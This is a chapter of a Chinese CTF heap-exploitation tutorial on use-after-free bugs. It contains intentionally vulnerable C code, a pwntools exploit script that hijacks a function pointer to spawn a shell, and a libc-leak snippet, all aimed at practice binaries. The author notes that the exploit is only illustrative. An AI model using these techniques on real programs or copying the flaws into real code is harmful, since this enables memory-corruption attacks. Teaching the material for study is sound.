# 第 19 章 UAF：释放后的幽灵

> Use After Free——程序 free 了一块内存，却还留着指向它的指针。这块「已死」的内存会被重新分配，而旧指针还在——于是新旧两个身份在同一块内存上重叠了。

---

## 19.1 什么是 UAF

**UAF（Use After Free）** 指程序在释放一块内存后，继续使用它（读或写）。这是一种非常常见的堆漏洞。

典型的 UAF 代码：

```c
struct Obj {
    void (*func)(char *);
    char data[24];
};

void print_data(char *s) { printf("%s\n", s); }
void system_cmd(char *s) { system(s); }

int main() {
    struct Obj *obj = malloc(sizeof(struct Obj));
    obj->func = print_data;
    strcpy(obj->data, "hello");
    
    free(obj);              // 释放了对象
    
    // 但 obj 指针还留着，而且被继续使用了！
    obj->func(obj->data);   // UAF：调用已释放对象里的函数指针
}
```

在 `free(obj)` 之后，`obj` 指向的内存回到了 tcache/bin 里。如果这时再 malloc 一块同样大小的内存，很可能拿到同一块内存，并用新的数据覆盖它。而旧的 `obj` 指针还指向那里——这就是攻击面。

---

## 19.2 UAF 的成因

UAF 通常来自以下编程错误：

1. **free 后没有把指针置 NULL**

```c
free(ptr);
ptr = NULL;   // 应该这样做，但程序员忘了
```

2. **多个指针指向同一块内存**

```c
char *a = malloc(0x20);
char *b = a;      // b 也指向同一块
free(a);          // a 释放了
use(b);           // 但 b 还在用 → UAF
```

3. **对象生命周期管理错误**（C++ 里常见）

---

## 19.3 UAF 的利用思路

UAF 的核心思想是**类型混淆（Type Confusion）**：

```text
1. 分配对象 A（包含函数指针 func）
2. free A（但指针还在）
3. 分配对象 B（同样大小），内容由我们控制
4. B 占据了 A 原来的内存
5. 通过 A 的旧指针调用 func → 实际调用的是我们写入 B 的内容！
```

用图表示：

```text
时间线：

t1: malloc → chunk X，obj 指向 X
    ┌──────────────┐
 X  │ func=print   │
    │ data="hello" │
    └──────────────┘

t2: free(X) → X 进入 tcache
    ┌──────────────┐
 X  │ fd = ...     │  ← user data 被 tcache 的 fd 覆盖
    │ ...          │
    └──────────────┘

t3: malloc → 又拿到 X，写入我们控制的数据
    ┌──────────────┐
 X  │ func=system  │  ← 我们伪造的函数指针！
    │ data="/bin/sh"│
    └──────────────┘

t4: obj->func(obj->data) → system("/bin/sh") → getshell！
```

---

## 19.4 实战例题

### 题目描述

一个典型的「记事本」程序，可以添加、删除、打印笔记：

```c
// uaf.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct note {
    void (*print)(char *);
    char content[24];
} Note;

void print_note(char *s) { printf("Content: %s\n", s); }
void backdoor(char *s)   { system("/bin/sh"); }

Note *notes[10];

void add_note(int idx) {
    notes[idx] = malloc(sizeof(Note));
    notes[idx]->print = print_note;
    strncpy(notes[idx]->content, "hello", 24);
    printf("Added note %d\n", idx);
}

void del_note(int idx) {
    free(notes[idx]);        // 漏洞：free 后没有置 NULL
    printf("Deleted note %d\n", idx);
}

void print_note_content(int idx) {
    notes[idx]->print(notes[idx]->content);   // UAF：继续使用已释放的指针
}

int main() {
    int choice, idx;
    while (1) {
        puts("1. Add  2. Delete  3. Print  4. Exit");
        scanf("%d", &choice);
        if (choice == 1) {
            scanf("%d", &idx); add_note(idx);
        } else if (choice == 2) {
            scanf("%d", &idx); del_note(idx);
        } else if (choice == 3) {
            scanf("%d", &idx); print_note_content(idx);
        } else break;
    }
}
```

### 分析

1. `del_note` 释放了 chunk，但 `notes[idx]` 指针还在
2. `add_note` 会重新 malloc 同样大小的 chunk，很可能拿回刚释放的那块
3. 但 `add_note` 固定写入 `print_note`，我们无法控制内容……

等等，这个例子里 add_note 没有让我们控制内容。需要一个能控制内容的输入点。修改一下：假设 `add_note` 允许输入内容：

```c
void add_note(int idx) {
    notes[idx] = malloc(sizeof(Note));
    notes[idx]->print = print_note;
    printf("Content: ");
    read(0, notes[idx]->content, 24);    // 我们控制内容
}
```

### 利用步骤

1. `add_note(0)` → 分配 chunk X
2. `del_note(0)` → free X，X 进入 tcache
3. `add_note(1)` → 再次分配，拿到 X（tcache LIFO）
4. 这次我们控制 content，但 `print` 字段仍被设为 `print_note`

问题：无法直接修改 `print` 函数指针。怎么办？

**换个思路**：如果程序有一个能直接 malloc 并写入任意内容的函数（比如输入一个字符串），我们可以：

1. `add_note(0)` → 分配 chunk X
2. `del_note(0)` → free X
3. 用另一个输入函数分配一个同样大小的 chunk，写入我们的数据：
   - 前 8 字节（func 位置）= `backdoor` 地址
   - 后面 = `/bin/sh`
4. 调用 `print_note_content(0)` → 触发 `backdoor("/bin/sh")`

### 完整 exp

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./uaf', checksec=False)

p = process(elf.path)

def add(idx, content):
    p.sendlineafter(b'Choice: ', b'1')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Content: ', content)

def delete(idx):
    p.sendlineafter(b'Choice: ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def show(idx):
    p.sendlineafter(b'Choice: ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())

# 1. 分配并释放 note 0
add(0, b'AAAA')
delete(0)   # chunk 进入 tcache

# 2. 重新分配，占据同一块内存，写入伪造的函数指针
#    假设有一个 add_raw 功能允许我们控制前 8 字节
backdoor = elf.sym['backdoor']
payload = p64(backdoor) + b'/bin/sh\x00'
add(1, payload)

# 3. 通过 note 0 的旧指针触发 → 调用 backdoor("/bin/sh")
show(0)
p.interactive()
```

> ⚠️ **注意**：这个 exp 是示意性的，具体要程序的 `add_note` 允许我们控制前 8 字节（函数指针位置）。不同的 UAF 题目有不同的利用方式，关键思路都是「让旧指针指向被我们控制的新数据」。

---

## 19.5 UAF 的其他利用方式

### 19.5.1 泄露 libc（unsorted bin leak）

如果释放的 chunk 进入 unsorted bin（大于 tcache/fastbin 范围），它的 fd/bk 会指向 main_arena。如果程序能打印已释放 chunk 的内容（UAF 读），就能泄露 libc 地址：

```python
# 分配一个大于 tcache 范围的 chunk
add(0, b'A' * 0x500)
delete(0)   # 进入 unsorted bin

# UAF 读：打印已释放 chunk 的 user data（前 8 字节是 fd）
show(0)
leak = u64(p.recvline().strip()[:6].ljust(8, b'\x00'))
libc_base = leak - (main_arena_offset + 96)
```

### 19.5.2 fastbin attack

如果 UAF 能控制已释放 chunk 的 fd 指针，可以把它改成任意地址，让 malloc 返回指向目标地址的 chunk——这就是 fastbin attack（第 21 章）。

---

## 19.6 常见坑

1. **tcache 的干扰**：glibc 2.26+ 引入 tcache 后，free 的小块先进入 tcache 而不是 fastbin/bin。测试时要考虑 tcache 的大小限制（≤ 0x410）和容量（7 个）。
2. **chunk 大小**：确保分配和释放的是同一大小的 chunk，否则 malloc 不会拿回同一块。
3. **tcache 的 key 检查**（2.29+）：从 tcache 取出 chunk 时会检查 key 字段，伪造要注意。
4. **合并问题**：如果两个相邻的小 chunk 都被 free，它们可能合并成一个大 chunk，改变布局。

---

## 19.7 小结

这一章我们学了 UAF：

- **成因**：free 后指针没置 NULL，继续使用
- **核心思想**：类型混淆——让旧指针指向我们控制的新数据
- **利用方式**：劫持函数指针、泄露 libc（unsorted bin leak）、fastbin attack
- **注意**：tcache 会改变 chunk 的回收路径，glibc 版本影响很大

UAF 是最直观的堆漏洞，也是很多复杂利用的基础。下一章我们学习 Double Free——UAF 的「近亲」，同样依赖对已释放 chunk 的控制。

---

**下一章**：[Double Free：一物两卖](./ch20-Double-Free.md)
